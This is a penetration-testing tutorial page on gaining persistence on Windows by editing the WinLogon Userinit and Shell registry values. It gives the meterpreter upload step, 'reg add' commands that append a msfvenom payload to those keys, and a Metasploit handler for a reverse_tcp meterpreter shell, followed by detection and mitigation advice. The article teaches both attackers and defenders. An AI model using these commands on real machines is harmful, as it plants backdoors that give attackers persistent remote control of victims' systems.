<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/persistence/" rel="category tag">Persistence</a></span>            </div>
            <h1 class="post-title entry-title">Windows Persistence using WinLogon</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-persistence-using-winlogon/" rel="bookmark"><time class="entry-date published" datetime="2020-04-12T12:00:52+00:00">April 12, 2020</time><time class="updated" datetime="2025-05-25T15:28:50+00:00">May 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, we are going to describe the ability of the WinLogon process to provide persistent access to the Target Machine.</span></p>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
<li><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
<li><span style="color: #000000;"><strong>Default Registry Key Values</strong></span></li>
<li><span style="color: #000000;"><strong>Persistence using WinLogon </strong></span>
<ul>
<li><span style="color: #000000;">Using Userinit Key</span></li>
<li><span style="color: #000000;">Using the Shell Key</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Detection</strong></span></li>
<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
</ul>
<h3><span style="color: #800000;">Introduction</span></h3>
<p><span style="color: #000000;">The Winlogon process is a very important part of the Windows operating system, and Windows will be unusable without it.</span></p>
<p><span style="color: #000000;">This process performs many important tasks related to the Windows sign-in process. For example, when you sign in, the Winlogon process is responsible for loading your user profile into the registry. Hence, each Windows user account is dependent on WinLogon to use the keys under HKEY_CURRENT_USER which is unique for each user account.</span></p>
<p><span style="color: #000000;">Winlogon has special hooks into the system and watches to see if you press Ctrl+Alt+Delete. This is known as the “secure attention sequence”, and it’s why some PCs may be configured to require you to press Ctrl+Alt+Delete before you sign in. This combination of keyboard shortcuts is constantly caught by Winlogon, which guarantees you’re signing in on a safe desktop where different programs can’t monitor the password you’re typing or impersonate a sign-in dialog.</span></p>
<p><span style="color: #000000;">The Windows Logon Application additionally monitors the keyboard and mouse action and is liable for locking your PC and starting screen savers after a time of no activity.</span></p>
<p><span style="color: #000000;">Microsoft Official site provides a more detailed, technical list of <strong><a style="color: #000000;" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/responsibilities-of-winlogon?redirectedfrom=MSDN">Winlogon’s responsibilities</a>.</strong></span></p>
<h3><span style="color: #800000;">Configurations used in Practical</span></h3>
<p><span style="color: #000000;"><strong>Attacker:</strong></span></p>
<p><span style="color: #000000;"><strong>    OS: </strong>Kali Linux 2020.1</span></p>
<p><span style="color: #000000;"><strong>    IP: </strong>192.168.1.112</span></p>
<p><span style="color: #000000;"><strong>Target:</strong></span></p>
<p><span style="color: #000000;"><strong>    OS: </strong>Windows 10</span></p>
<p><span style="color: #000000;"><strong>    IP: </strong>192.168.1.104</span></p>
<h3><span style="color: #800000;">Default Registry Key Values</span></h3>
<p><span style="color: #000000;">Now as discussed in the introduction, the WinLogon process controls the HKEY_CURRENT_USER. But being a Windows Propriety Software, its registry values are located in the HKEY_LOCAL_MACHINE. If we want to take a look at the Registry Key Values for WinLogon, we will have to open the Registry Editor. This can be achieved by typing Regedit in the Run Panel. Then Traverse to the following Location:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Lfl8opkcPaI/XpMAlszmGkI/AAAAAAAAjfY/8QxCMPnbBFc46TmNNz9qEBc5AS87aiZzwCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Now here among a lot of other keys we see that we have keys named Userint and Shell of REG_SZ type. We will be using these keys to gain persistence over this machine. The scenario that can be related here is that the attacker gains a meterpreter session over the Target Machine here. The attacker can use any method of their choice. Then he uses the meterpreter session to alter the Registry Keys in WinLogon to convert its session into a persistence session. </span></p>
<h3><span style="color: #800000;">Persistence using Userinit Key</span></h3>
<h4><span style="color: #000000;">Transfering Malicious Executable</span></h4>
<p><span style="color: #000000;">We created a malicious executable file named raj.exe using the msfvenom tool. More about that <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/msfvenom-tutorials-beginners/">here</a></strong></span>. Now using the meterpreter session that we already obtained, we transfer this malicious executable to the Target Machine. We will be using the upload command of the meterpreter for this. After the file is successfully uploaded to the Target Machine, we ran the shell command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/raj.exe</pre>
<h4><span style="color: #000000;">Modifying Registry Values </span></h4>
<p><span style="color: #000000;">Since we have the shell of the Target System, we used the “reg query” command to get information about the Userinit Key of WinLogon. We see that it has the default value we saw earlier. Now using the “reg add” command we modified the key value to hold the malicious executable as well.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, raj.exe" /f
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit</pre>
<p><span style="color: #000000;">We ran the “reg query” command again to ensure that the values are indeed modified.</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-bnzso0_i2ec/XpMAlem8YHI/AAAAAAAAjfU/n3RIwBkOoIk5LgV0rhWj6pKn8H6RUYZ5gCLcBGAsYHQ/s1600/2.png" alt="Windows Persistence using Winlogon" width="1057" height="457"/></span></p>
<p><span style="color: #000000;">We can also verify the modification manually here as shown in this image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6OBBN0hEQ_8/XpMAlRfQ23I/AAAAAAAAjfQ/kCQ_dA9Iu1crZYUZTLbhZEOFGLAeJAKAwCLcBGAsYHQ/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Gaining Persistent Shell</span></h3>
<p><span style="color: #000000;">Now that we have made the changes in the registry. We should be getting a persistent shell as soon as the WinLogon is triggered. Although we need to have a listener set up for the session that is generated. The listener should have the same configurations as IP Address and Port that were used in crafting the payload. Here we can see that we have a persistent shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.112
set lport 4444
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-cmVB8JBbGXo/XpMAmECtwrI/AAAAAAAAjfc/VEwMX_qsCAMXO4mbJB8qN6WLuPGuXFswACLcBGAsYHQ/s1600/4.png" alt="Windows Persistence using Winlogon" width="656" height="365"/></span></p>
<h3><span style="color: #800000;">Persistence using Shell Key</span></h3>
<p><span style="color: #000000;">We got our persistence using the Userinit key. Now let’s focus on another key that can be used to achieve persistence over the Target Machine. It is the Shell key. It by default holds the explorer.exe as shown in the given below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HQiIQVGX00o/XpMAmaq4wHI/AAAAAAAAjfg/eYsMsY4Y0HEKXu1vfpd2J8aA7XXYb2NxQCLcBGAsYHQ/s1600/5.png"/></span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Modifying Registry Values</span> </span></h3>
<p><span style="color: #000000;">As we did in the previous practices, we will be gaining a meterpreter session, then we will be transferring the payload over to the Target Machine using the upload command. Then we will be adding the name of the executable in the Registry Value using reg add command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/raj.exe
shell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, raj.exe" /f</pre>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-8lPrggO0ekI/XpMAmu2yU-I/AAAAAAAAjfk/UFBxOTDc3-cAbZAAWyohCStjQaxlcrlagCLcBGAsYHQ/s1600/6.png" alt="Windows Persistence using Winlogon" width="1043" height="457"/></span></p>
<p><span style="color: #000000;">We can verify that the payload is indeed added to the Shell Key by going to the location in the Registry Editor</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7IOiTVOS-co/XpMAm4vpIUI/AAAAAAAAjfo/OtnnLI89epE1Q9t451VzbqdkVcyZWrFwwCLcBGAsYHQ/s1600/7.png"/></span></p>
<h3><span style="color: #800000;">Gaining Persistent Shell</span></h3>
<p><span style="color: #000000;">Now that we have made the changes in the registry. We should be getting a persistent shell as soon as the WinLogon is triggered. Although we need to have a listener set up for the session that is generated. The listener should have the same configurations as IP Address and Port that were used in crafting the payload. Here we can see that we have a persistent shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.112
set lport 4444
exploit</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-9Ix0GU2xaM0/XpMAnVxN1LI/AAAAAAAAjfs/piRA61iPu3I7f_lG6e-pMcSYF4lgUo76ACLcBGAsYHQ/s1600/9.png" alt="Windows Persistence using Winlogon" width="685" height="364"/></span></p>
<h3><span style="color: #800000;">Detection</span></h3>
<ul>
<li><span style="color: #000000;">Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc.</span></li>
<li><span style="color: #000000;">Tools such as Sysinternals Autoruns can detect system changes that attempts at persistence may try, including listing current Winlogon helper values.</span></li>
<li><span style="color: #000000;">New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.</span></li>
<li><span style="color: #000000;">Look for abnormal process behavior that may be due to a process loading a malicious DLL.</span></li>
<li><span style="color: #000000;">View data and events not in isolation but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and performing Lateral Movement.</span></li>
</ul>
<h3><span style="color: #800000;">Mitigation</span></h3>
<ul>
<li><span style="color: #000000;">Identify and block potentially malicious software that may execute through the Winlogon helper process by using whitelisting tools like AppLocker that can audit and/or block unknown DLLs.</span></li>
<li><span style="color: #000000;">Limit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes.</span></li>
</ul>
<p><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://attack.mitre.org/techniques/T1004/">MITRE|ATT&amp;CK</a></span></p>
<p><span style="color: #000000;">To learn more about Windows Persistence. Follow this <strong><a href="https://www.hackingarticles.in/tag/windows-persistence/">Link.</a></strong></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
